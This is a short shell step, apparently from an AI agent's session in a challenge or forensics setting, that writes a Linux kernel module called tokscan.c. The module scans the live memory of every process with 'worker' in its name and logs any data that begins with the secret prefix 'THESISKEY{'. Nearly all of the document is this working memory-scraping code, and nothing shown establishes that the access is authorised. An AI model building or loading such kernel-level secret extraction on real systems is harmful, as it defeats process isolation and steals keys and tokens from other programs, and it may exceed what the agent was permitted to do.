# The prior evidence used a "readmem4" module already. Let me build our own to scan live memory now.
# Use host build dir. Set up build environment.
mkdir -p /root/km && cd /root/km
cat > tokscan.c <<'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/sched/mm.h>
#include <linux/mm.h>
#include <linux/mm_types.h>
#include <linux/uaccess.h>
#include <linux/highmem.h>

MODULE_LICENSE("GPL");

static const char *pat = "THESISKEY{";
#define PATLEN 10

static void scan_task(struct task_struct *t)
{
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    mm = get_task_mm(t);
    if (!mm) return;
    down_read(&mm->mmap_lock);
    for (vma = mm->mmap; vma; vma = vma->vm_next) {
        unsigned long addr;
        if (!(vma->vm_flags & VM_READ)) continue;
        for (addr = vma->vm_start; addr + 96 < vma->vm_end; addr += 1) {
            char buf[96];
            int i, ok=1;
            struct page *page;
            void *kaddr;
            unsigned long pfn_off = addr & ~PAGE_MASK;
            /* only attempt when we can get page */
            if (pfn_off > PAGE_SIZE - 96) { continue; }
            {
                int locked = 1;
                long r;
                r = get_user_pages_remote(mm, addr, 1, 0, &page, NULL, &locked);
                if (r != 1) { if(!locked) down_read(&mm->mmap_lock); continue; }
                kaddr = kmap(page);
                memcpy(buf, kaddr + pfn_off, 96);
                kunmap(page);
                put_page(page);
                if (!locked) down_read(&mm->mmap_lock);
            }
            for (i=0;i<PATLEN;i++){ if(buf[i]!=pat[i]){ok=0;break;} }
            if (ok) {
                buf[95]=0;
                pr_info("tokscan: pid=%d comm=%s addr=%lx: %.90s\n", t->pid, t->comm, addr, buf);
            }
        }
    }
    up_read(&mm->mmap_lock);
    mmput(mm);
}

static int __init m_init(void)
{
    struct task_struct *t;
    pr_info("tokscan: start\n");
    for_each_process(t) {
        if (strstr(t->comm, "app-worker") || strstr(t->comm, "worker")) {
            pr_info("tokscan: scanning pid=%d comm=%s\n", t->pid, t->comm);
            scan_task(t);
        }
    }
    pr_info("tokscan: done\n");
    return 0;
}
static void __exit m_exit(void){ pr_info("tokscan: unload\n"); }
module_init(m_init);
module_exit(m_exit);
EOF
